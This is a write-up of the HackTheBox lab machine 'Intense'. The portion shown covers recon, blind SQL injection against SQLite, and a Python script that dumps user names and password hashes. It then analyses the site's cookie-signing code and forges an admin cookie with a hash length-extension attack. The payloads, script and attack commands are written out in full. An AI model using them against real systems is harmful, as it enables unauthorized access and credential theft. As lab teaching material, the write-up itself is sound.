---
title: HTB: Intense
url: https://0xdf.gitlab.io/2020/11/14/htb-intense.html
date: 2020-11-14T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-intense, ctf, hackthebox, nmap, snmp, snmpwalk, sqli, injection, sqlite, python, burp, bruteforce, penglab, cookies, hash-extension, hash-extender, directory-traversal, snmp-shell, tunnel, bof, logic-error, htb-rope, gdb, peda
---

![Intense](https://0xdfimages.gitlab.io/img/intense-cover.png)

Intense presented some cool challenges. I’ll start by finding a SQL injection vulnerability into an sqlite database. I’m able to leak the admin hash, but not crack it. Using the source code for the site, I’ll see that if I can use a hash extension attack, I can use the hash trick the site into providing admin access. From there, I’ll use a directory traversal bug in a log reading API to find SNMP read/write creds, which I’ll use to get a shell with snmp-shell. I can use that to find a custom binary listening on localhost, as well as it’s source code. I’ll use the snmp account to create an SSH tunnel, and exploit a logic bug in the code to overflow the buffer, bypass protections, and get a shell as root. In Beyond Root, I’ll look at why I didn’t have success with the system libc call in my ROP, figure out why, and fix it.

## Box Info

| Name | [Intense](https://hackthebox.com/machines/intense)  [Intense](https://hackthebox.com/machines/intense) [Play on HackTheBox](https://hackthebox.com/machines/intense) |
| --- | --- |
| Release Date | [04 Jul 2020](https://twitter.com/hackthebox_eu/status/1278770534965219328) |
| Retire Date | 14 Nov 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Intense |
| Radar Graph | Radar chart for Intense |
| First Blood User | 01:52:39[qtc qtc](https://app.hackthebox.com/users/103578) |
| First Blood Root | 08:20:28[qtc qtc](https://app.hackthebox.com/users/103578) |
| Creator | [sokafr sokafr](https://app.hackthebox.com/users/19014) |

## Recon

### nmap

`nmap` shows two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.195
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 14:58 EDT
Nmap scan report for 10.10.10.195
Host is up (0.36s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.44 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.195
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 14:59 EDT
Nmap scan report for 10.10.10.195
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)           
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                        
Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu Bionic 18.04. The webserver is running NGINX as opposed to Apache.

`nmap` also shows SNMP on UDP 161:

```

root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.195
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 15:33 EDT
Nmap scan report for 10.10.10.195
Host is up (0.013s latency).
Not shown: 65534 open|filtered ports
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds

```

### SNMP - UDP 161

`snmpwalk` will dump all the output using the public string:

```

root@kali# snmpwalk -v 2c -c public 10.10.10.195
SNMPv2-MIB::sysDescr.0 = STRING: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (18407) 0:03:04.07
SNMPv2-MIB::sysContact.0 = STRING: Me <user@intense.htb>
SNMPv2-MIB::sysName.0 = STRING: intense
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.8 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.2 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.3 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (2) 0:00:00.02
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (4249645) 11:48:16.45
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2020-7-8,19:43:5.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-4.15.0-55-generic root=UUID=03e76848-bab1-4f80-aeb0-ffff441d2ae9 ro debian-installer/custom-installatio"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 165
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```

That’s relatively tiny for SNMP. It does contain an email address, user@intense.htb, but not much I’ll find useful here.

### Website - TCP 80

#### Site

The site doesn’t say much about what it is:

![image-20200705150338442](https://0xdfimages.gitlab.io/img/image-20200705150338442.png)

It does offer several things on this small page that are interesting:
- I should be able to log in as guest / guest.
- When I try to determine the tech stack by checking for `index.php`, `index.html`, and `index.htm`, they all come back 404. The links point to `/home` (which sees the same as `/`) and `/login`. My guess is this is a Python or JavaScript / Node application, but it could be something else.
- It says the application is open source, and has a link to `http://10.10.10.195/src.zip`.

#### Logged In

I’ll login as guest / guest, and now the site has a Logout link where the Login link used to be, and there’s another link, Submit:

![image-20200705152303963](https://0xdfimages.gitlab.io/img/image-20200705152303963.png)

There’s a hint here not to use automated tools:

> Please send me feedback ! :)
>
> One day, an old man said “there is no point using automated tools, better to craft his own”.

#### /submit

`/submit` has a box for feedback:

![image-20200705152507112](https://0xdfimages.gitlab.io/img/image-20200705152507112.png)

On submitting a valid message, it pops a success message, and then redirects after two seconds to the main page:

![image-20200707082441290](https://0xdfimages.gitlab.io/img/image-20200707082441290.png)

#### Directory Brute Force

I’ll run `gobuster` against the site. I didn’t give any extensions because of the type of site it seems to be:

```

root@kali# gobuster dir -u http://10.10.10.195 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -o scansgobuster-root-medium
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.195
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/05 15:10:16 Starting gobuster
===============================================================
/home (Status: 200)
/login (Status: 200)
/submit (Status: 200)
/admin (Status: 403)
/logout (Status: 200)
===============================================================
2020/07/05 15:19:16 Finished
===============================================================

```

This is likely unnecessary since I have the page source, but it’s better to verify, and doesn’t hurt to have running in the background.

The only new path is `/admin`, which returns 403:

![image-20200705152738881](https://0xdfimages.gitlab.io/img/image-20200705152738881.png)

## File System Access

### SQLI

#### Identify

On `/submit`, the message submission is run out of the Javascript at `http://10.10.10.195/static/lib/php-mail-form/validate.js`:

```

    var this_form = $(this);
    this_form.find('.sent-message').slideUp();
    this_form.find('.error-message').slideUp();
    this_form.find('.loading').slideDown();
    $.ajax({
      type: "POST",
      url: action,
      data: str,
      success: function(msg) {
        if (msg == 'OK') {
          this_form.find('.loading').slideUp();
          this_form.find('.sent-message').slideDown();
          this_form.find("input, textarea").val('');
          setInterval(function(){document.location.href="/home";}, 2000);
        } else {
          this_form.find('.loading').slideUp();
          this_form.find('.error-message').slideDown().html(msg);
        }
      }
    });
    return false;
  });

```

On submitting, it sends an AJAX request. If the message back is `OK`, it shows success and then redirects in 2 seconds. If the message back is anything other than `OK`, it displays that message as the error message. This is useful to know.

There’s some client-side JavaScript that checks that a message is at least four characters. If I enter `'`  (with 3 spaces), it returns an error message and no redirect:

![image-20200707084809039](https://0xdfimages.gitlab.io/img/image-20200707084809039.png)

Googling for “unrecognied token” returns a bunch of SQLite discussions:

![image-20200707084936646](https://0xdfimages.gitlab.io/img/image-20200707084936646.png)

Looks like SQL injection into SQLite.

#### POC #1 - Boolean

I found this site with a [list of SQL Functions built into SQLite](https://www.sqlite.org/lang_corefunc.html), and started playing around with them in Burp repeater. `message` expects a string value, and I can guess (or check in the source code, but I haven’t needed to get into that yet) that the SQL query looks something like:

```

insert into tablename values('{input}')

```

I’ll use `||` to concatenate the various function output to the rest of the input. When I get to `load_extension()`, the page returned an error message:

[![image-20200707123634277](https://0xdfimages.gitlab.io/img/image-20200707123634277.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200707123634277.png)

This feedback will allow me to create a boolean test. For example, this query:

```

insert into messages values (''||(select username from users where username LIKE 'x%' and load_extension('a'))||'');

```

It will try to fetch usernames starting with `x` from the users table. If it’s successful, it will then try to call `load_extension` and fail. To build this query, I created a local SQLite db with a dummy users and messages tables:

```

root@kali# sqlite3 test.db
SQLite version 3.31.1 2020-01-27 19:55:54                                                          
Enter ".help" for usage hints.         
sqlite> create table users (id INTEGER PRIMARY KEY, username TEXT, secret TEXT);
sqlite> insert into users (username, secret) values ('user1', 'password');                          
sqlite> create table messages (msg TEXT);                                                           

```

Now I can test this out. I eventually got it working. When I run the following, it successfully returns a user that starts with `u` and then tries to call `load_extension` and fails (different error message, but still ok):

```

sqlite> insert into messages values (''||(select username from users where username LIKE 'u%' and load_extension('a'))||'');
Error: a.so: cannot open shared object file: No such file or directory

```

When I try it with `x` instead of `u`, it just succeeds.

I can pivot this over to Repeater, and it works there too. I know there’s a guest user, and I get `not authorized` with I check for a user starting with `g`:

[![image-20200707124242540](https://0xdfimages.gitlab.io/img/image-20200707124242540.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200707124242540.png)

I get the same result for starting with `a` (admin?), but not `b`:

[![image-20200707124315692](https://0xdfimages.gitlab.io/img/image-20200707124315692.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200707124315692.png)

#### POC #2 - Time Based

Most references I could find for time-based injections for SQLite used functions like `randomblob` to generate sleep (functions that take time to run). When I try this, I’m blocked:

![image-20200707125620716](https://0xdfimages.gitlab.io/img/image-20200707125620716.png)

In the source, there’s a check for “bad words”:

```

def badword_in_str(data):
    data = data.lower()
    badwords = ["rand", "system", "exec", "date"]
    for badword in badwords:
        if badword in data:
            return True
    return False

```

It turns out that `zeroblob` can also be used to take time. Both of these lines return nothing, but the first one takes a second or two to run, whereas the second is instant:

```

sqlite> insert into messages values (''||(select hex(zeroblob(100000000)) from users where username LIKE 'u%')||'');
sqlite> insert into messages values (''||(select hex(zeroblob(100000000)) from users where username LIKE 'z%')||'');

```

Switching back to Intense, when I look for a user starting with `b`, the response time is typically around 0.22 seconds:

[![image-20200707131729790](https://0xdfimages.gitlab.io/img/image-20200707131729790.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200707131729790.png)

When I switch that to `g`, the time increases to 0.68+ seconds:

[![image-20200707131831993](https://0xdfimages.gitlab.io/img/image-20200707131831993.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200707131831993.png)

#### Script to Dump Users and Secrets

I wrote the following script:

```

#!/usr/bin/env python3

import requests
import string
import sys

def brute_user(res):
    for c in string.ascii_lowercase + string.digits:
        sys.stdout.write(f"\r[*] Trying username: {res}{c.ljust(20)}")
        sys.stdout.flush()
        resp = requests.post(
            "http://10.10.10.195/submitmessage",
            data=f"message='||(select username from users where username LIKE '{res + c}%' and load_extension('a'))||'",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if "not authorized" in resp.text:
            resp = requests.post(
                "http://10.10.10.195/submitmessage",
                data=f"message='||(select username from users where username = '{res + c}' and load_extension('a'))||'",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if "not authorized" in resp.text:
                print(f"\r[+] Found user: {res}{c.ljust(20)}")
                brute_pass(res + c)
            brute_user(res + c)

def brute_pass(user):
    password = ""
    for i in range(64):
        for c in string.hexdigits:
            sys.stdout.write(f"\r[+] Password: {password}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://10.10.10.195/submitmessage",
                data=f"message='||(select secret from users where username = '{user}' and substr(secret, {i+1},1) = '{c}' and load_extension('a'))||'",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if "not authorized" in resp.text:
                password += c
                break
    print(f"\r[+] Found secret: {password.ljust(20)}")

brute_user("")
print("\r" + "".ljust(80))

```

The idea here is two brute forces. The first will start with a string, and loop over each character to see if a username that starts with the given starting string plus that character exists. If it does, the two are combined and passed back into the same function. But first it also checks if the resulting string is on it’s own a valid username. If so, that username is passed to the next function. The way the looping is set up, it would successfully identify the usernames “admin”, “admin1”, and “admon” all in the same database.

The second function, takes advantage of the fact that the source shows the secret is stored as a SHA256 to just loop over 64 hex characters:

```

def hash_password(password):
    """ Hash password with a secure hashing function """
    return sha256(password.encode()).hexdigest()

```

It also uses the fact that any given username should have only one secret. So this function doesn’t have to use recursion, but rather just a loop with a break on success.

Originally I was checking `select secret from users where username = '{user}' and secret LIKE '{password + c}%' and load_extension('a')`, but once the hash got too long, the entire query went over 140 characters and the message back changed to that error message. I adjusted to just checking the current character using `substr`, and it works:

```

root@kali# python3 dump_users.py 
[+] Found user: admin                         
[+] Found secret: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
[+] Found user: guest                         
[+] Found secret: 84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec

```

I added some pretty output to help the user see progress:

[![sqli-script-running](https://0xdfimages.gitlab.io/img/intense-sqli-dump.gif)*Click for full size image*](https://0xdfimages.gitlab.io/img/intense-sqli-dump.gif)

### Hash Crack Fail

I tried to crack it using hashcat, using [Penglab](https://github.com/mxrch/penglab), with these two cells at the bottom:

```

mode = 1400
hashes = """
admin:f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
guest:84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec
"""
with open('hashes','w') as f:
  f.write(hashes)
with open('mode', 'w') as f:
  f.write(f'{mode}')

```

```

!time hashcat -m $(cat mode) ./hashes /content/wordlists/rockyou.txt --user
!echo -e "\n\nPasswords: "
!hashcat -m $(cat mode) ./hashes --show --user | while read line; do user=$(echo $line | cut -d: -f1); pass=$(echo $line | rev | cut -d: -f1 | rev); echo "$user: $pass"; done

```

It prints the results at the end, finding only the password for guest, which I already knew:

```

Passwords: 
guest: guest

```

### Cookie Manipulation

#### Source Analysis

Without the password, maybe I can use the hash to generate a cookie as admin. When a user logs in, the POST request goes to `/postlogin`, which is handled here:

```

@app.route("/postlogin", methods=["POST"])
def postlogin():
    # return user's info if exists
    data = try_login(request.form)
    if data:
        resp = make_response("OK")
        # create new cookie session to authenticate user
        session = lwt.create_session(data)
        cookie = lwt.create_cookie(session)
        resp.set_cookie("auth", cookie)
        return resp
    return "Login failed"

```

The POST data is passed to `try_login`, which is here:

```

def try_login(form):
    """ Try to login with the submitted user info """
    if not form:
        return None
    username = form["username"]
    password = hash_password(form["password"])
    result = query_db("select count(*) from users where username = ? and secret = ?", (username, password), one=True)
    if result and result[0]:
        return {"username": username, "secret":password}
    return None

```

It hashes the password, and checks the database for the existence of a user with that password hash. This query isn’t vulnerable to injection. If the creds are good, it returns a JSON object containing the username and hash.

That `data` is used back in `postlogin` to create a cookie. First, it’s passed to `lwt.create_session`, which simply converts the JSON into a string:

```

def create_session(data):
    """ Create session based on dict
        @data: {"key1":"value1","key2":"value2"}

        return "key1=value1;key2=value2;"
    """
    session = ""
    for k, v in data.items():
        session += f"{k}={v};"
    return session.encode()

```

The result is passed to `lwt.create_cookie`:

```

def create_cookie(session):
    cookie_sig = sign(session)
    return b64encode(session) + b'.' + b64encode(cookie_sig)

```

A signature for the session data is calculated, and then both the session string and the signature are base64 encoded, and concatenated with a `.`.

If I grab the cookie out of my current session, I can see this:

```

root@kali# echo "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.QFyViArMNX8PRBdR1TZ7+0zPOsOAU5loeuTzGSKXig8=" | cut -d. -f1 | base64 -d
username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
root@kali# echo "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.QFyViArMNX8PRBdR1TZ7+0zPOsOAU5loeuTzGSKXig8=" | cut -d. -f2 | base64 -d | xxd
00000000: 405c 9588 0acc 357f 0f44 1751 d536 7bfb  @\....5..D.Q.6{.
00000010: 4ccf 3ac3 8053 9968 7ae4 f319 2297 8a0f  L.:..S.hz..."...

```

The signature is 32 bytes long, and binary.

#### Failed Ideas

My first idea was to try to recover the secret used to sign the cookie. The code is here:

```

def sign(msg):
    """ Sign message with secret key """
    return sha256(SECRET + msg).digest()

```

`SECRET` is defined right at the top as between 8 and 15 random bytes from `os.urandom`:

```

SECRET = os.urandom(randrange(8, 15))

```

This will run at server start, and stay constant until next boot (which is has to for the cookies to be valid). I considered trying to brute force the key, using the cookie from my guest login, but there’s way too many to pull off.

I read about vulnerabilities in `os.urandom`, but it turns out that `urandom` is a cryptographically secure place to pull randomness from.

#### Hash Extension Attacks

A hash extension attack is a mathematical attack on hashes, including algorithms like MD5, SHA1, SHA-256, SHA512, and more. The idea takes advantage of how these algorithms generate hashes. First, the input is padded to typically eight bytes less than the hash size, and then the input is processed one block at a time. The output is the state after all the blocks are processed.

The attack here is that because we have the hash of some valid data, I can add something the end and use the known hash as the current state, and then calculate the new hash of the data with the evil data appended. In other words, I can append data to the end of the signed value, and use the original signature to generate a new signature, all without knowing the secret that was a part of the original string.

#### Source Check

The cookie is parsed into information used by the server in this function:

```

def parse_session(cookie):
    """ Parse cookie and return dict
        @cookie: "key1=value1;key2=value2"

        return {"key1":"value1","key2":"value2"}
    """
    b64_data, b64_sig = cookie.split('.')
    data = b64decode(b64_data)
    sig = b64decode(b64_sig)
    if not verif_signature(data, sig):
        raise InvalidSignature
    info = {}
    for group in data.split(b';'):
        try:
            if not group:
                continue
            key, val = group.split(b'=')
            info[key.decode()] = val
        except Exception:
            continue
    return info

```

One thing I can abuse here is that it looks over the data split by `;`, and doesn’t check that there are no duplicates. So if the string were `user=guest;user=admin`, python would split that, set `info['user'] = guest`, and then overwrite `info['user']` to `admin`.

#### Hash Extender

There’s a project on GitHub, [Hash Extender](https://github.com/iagox86/hash_extender) that automates the math here. You give it the data that is signed and the signature, as well as the length (or a range of lengths) for the secret, and the data you want to append, and it generates the new data and new signature.

I downloaded it:

```

root@kali:/opt# git clone https://github.com/iagox86/hash_extender.git
Cloning into 'hash_extender'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 620 (delta 10), reused 15 (delta 6), pack-reused 596
Receiving objects: 100% (620/620), 176.32 KiB | 6.30 MiB/s, done.
Resolving deltas: 100% (411/411), done.

```

Then I built the project with `make`, and it provided a binary:

```

root@kali:/opt# cd hash_extender/
root@kali:/opt/hash_extender# make
[CC] hash_extender.o
[CC] tiger.o
[CC] test.o
[CC] buffer.o
[CC] util.o
[CC] hash_extender_engine.o
[CC] formats.o
[LD] hash_extender
[CC] hash_extender_test.o
[LD] hash_extender_test
root@kali:/opt/hash_extender# ls -l hash_extender
-rwxr-xr-x 1 root root 122152 Jul  8 11:56 hash_extender

```

I’ll take the cookie I get from the site and break it into decoded data and hex encoded signature:

```

root@kali:/opt/hash_extender# echo dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.Ia7d5lEBIqkZEjNCken5Tz5cE685Q01pymJrfvK8lXY= | cut -d. -f1 | base64 -d
username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
root@kali:/opt/hash_extender# echo dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.Ia7d5lEBIqkZEjNCken5Tz5cE685Q01pymJrfvK8lXY= | cut -d. -f2 | base64 -d | xxd -p | tr -d '\n'
21aedde6510122a91912334291e9f94f3e5c13af39434d69ca626b7ef2bc9576

```

I used `xxd -p` to convert to a the raw binary back into hex.

Now I can use that with `hash_extender` to get a new message with a new signature:

```

root@kali:/opt/hash_extender# ./hash_extender --data 'username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;' --secret-min=8 --secret-max=15 --signature 405c95880acc357f0f441751d5367bfb4ccf3ac3805399687
ae4f31922978a0f --append ';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;' -f sha256                                                
Type: sha256                                                                                                                                                                                                                               
Secret length: 8                                                                                                     
New signature: b7e22f5c711cc2ef91abfb21ae42a981b99d91b7628a2f65ca9a5a965d78241e                                                                                                                                                            
New string: 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b8000000000000000000000000000000000000000000000000000000000000002f83b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b
                                                                                                                                                                                                                                           
Type: sha256               
Secret length: 9                                                                                                     
New signature: b7e22f5c711cc2ef91abfb21ae42a981b99d91b7628a2f65ca9a5a965d78241e
New string: 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b80000000000000000000000000000000000000000000000000000000000003003b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b
                                                                                                                                                                                                                                           
Type: sha256                                                                                                                                                                                                                               
Secret length: 10                                                                                                                                                                                                                          
New signature: b7e22f5c711cc2ef91abfb21ae42a981b99d91b7628a2f65ca9a5a965d78241e                                                                                                                                                            
New string: 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b800000000000000000000000000000000000000000000000000000000003083b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b
                                                          
Type: sha256
Secret length: 11
New signature: b7e22f5c711cc2ef91abfb21ae42a981b99d91b7628a2f65ca9a5a965d78241e
New string: 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b8000000000000000000000000000000000000000000000000000000003103b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b

Type: sha256
Secret length: 12
New signature: b7e22f5c711cc2ef91abfb21ae42a981b99d91b7628a2f65ca9a5a965d78241e
New string: 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b80000000000000000000000000000000000000000000000000000003183b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b

Type: sha256
Secret length: 13
New signature: b7e22f5c711cc2ef91abfb21ae42a981b99d91b7628a2f65ca9a5a965d78241e
New string: 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b800000000000000000000000000000000000000000000000000003203b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b

Type: sha256
Secret length: 14
New signature: b7e22f5c711cc2ef91abfb21ae42a981b99d91b7628a2f65ca9a5a965d78241e
New string: 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b8000000000000000000000000000000000000000000000000003283b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b

Type: sha256
Secret length: 15
New signature: b7e22f5c711cc2ef91abfb21ae42a981b99d91b7628a2f65ca9a5a965d78241e
New string: 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b80000000000000000000000000000000000000000000000003303b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b

```

The output is a bit much. The new string is in hex. If I pipe into `xxd -r -p` to convert that to raw bytes, and then back into `xxd` it will output a hexdump:

```

root@kali:/opt/hash_extender# echo 757365726e616d653d67756573743b7365637265743d383439383363363066376461616463316362383639383632316638303263306439663961336333633239356338313037343866623034383131356331383665633b80000000000000000000000000000000000000000000000003303b757365726e616d653d61646d696e3b7365637265743d663166633132303130633039343031366465663739316531343335646466646361656363663832353065333636333063306263393332383563323937313130353b | xxd -r -p | xxd
00000000: 7573 6572 6e61 6d65 3d67 7565 7374 3b73  username=guest;s
00000010: 6563 7265 743d 3834 3938 3363 3630 6637  ecret=84983c60f7
00000020: 6461 6164 6331 6362 3836 3938 3632 3166  daadc1cb8698621f
00000030: 3830 3263 3064 3966 3961 3363 3363 3239  802c0d9f9a3c3c29
00000040: 3563 3831 3037 3438 6662 3034 3831 3135  5c810748fb048115
00000050: 6331 3836 6563 3b80 0000 0000 0000 0000  c186ec;.........
00000060: 0000 0000 0000 0000 0000 0000 0000 0003  ................
00000070: 303b 7573 6572 6e61 6d65 3d61 646d 696e  0;username=admin
00000080: 3b73 6563 7265 743d 6631 6663 3132 3031  ;secret=f1fc1201
00000090: 3063 3039 3430 3136 6465 6637 3931 6531  0c094016def791e1
000000a0: 3433 3564 6466 6463 6165 6363 6638 3235  435ddfdcaeccf825
000000b0: 3065 3336 3633 3063 3062 6339 3332 3835  0e36630c0bc93285
000000c0: 6332 3937 3131 3035 3b                   c2971105;

```

The message is no longer ascii. But that’s ok because when it’s in the cookie, it’s base64-encoded.

